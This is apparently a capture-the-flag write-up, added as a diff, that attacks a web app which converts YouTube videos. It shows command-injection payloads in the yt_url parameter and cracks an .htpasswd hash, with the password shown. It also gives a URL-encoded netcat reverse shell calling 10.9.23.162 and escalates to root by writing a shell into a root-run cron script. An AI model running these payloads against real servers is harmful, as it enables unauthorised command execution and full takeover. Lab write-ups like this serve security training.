@@ -1,0 +1,59 @@
+site homepage most probably vulnerable to 
+============================================
+reflected file download
+
+type  test" in videoID box response
+
+{"status":2,"errors":"sh: 1: Syntax error: Unterminated quoted string\n","url_orginal":"https:\/\/www.youtube.com\/watch?v=test\"","output":"","result_url":"\/tmp\/downloads\/5eb0430133dd8.mp3"}
+
+//url_original: there is \ after test
+//"url_orginal":"https:\/\/www.youtube.com\/watch?v=yolo\""
+
+
+now detected probably vulnerable to command injection
+=====================================================
+-the homepage youtube converter use youtube-dl command to download videos.
+-placed the wrong input, shows errors in json form.
+
+tried payload: yt_url=;id;
+result : ... "url_orginal":";id;","output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n", ...
+
+escape whitespace prob
+======================
+-payload: yt_url=;uname<tab>-a;
+-result: "url_orginal":";uname\t-a;","output":"Linux dmv 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU\/Linux\n"
+
+user to access secret folder
+============================
+payload: yt_url=;cd	admin;ls	-a;cat	.htpasswd;
+itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
+
+john crack(MD5 APR):itsmeadmin:jessie
+ 
+userFlag
+========
+payload: yt_url=;cd	admin;ls	-a;cat	flag.txt;
+flag{0d8486a0c0c42503bb60ac77f4046ed7}
+
+
+get reverseShell (initialFoothold)
+==================================
+login to /admin
+-tht page clean download ?c= used to execute command
+
+payload: GET /admin/?c=%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%39%2e%32%33%2e%31%36%32%20%31%38%38%39%30%20%3e%2f%74%6d%70%2f%66 HTTP/1.1
+decoded: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.23.162 18890 >/tmp/f
+
+using pspy(monitor linux process without root)
+==============================================
+2020/05/06 09:55:01 CMD: UID=0    PID=3265   | bash /var/www/html/tmp/clean.sh 
+2020/05/06 09:55:01 CMD: UID=0    PID=3264   | /bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh 
+//found clean.sh script running as root user (uid=0)
+
+-write reverseShell payload into clean.sh
+-wait for nc capture (root user) reverse shell
+
+root flag
+=========
+flag{d9b368018e912b541a4eb68399c5e94a}
+
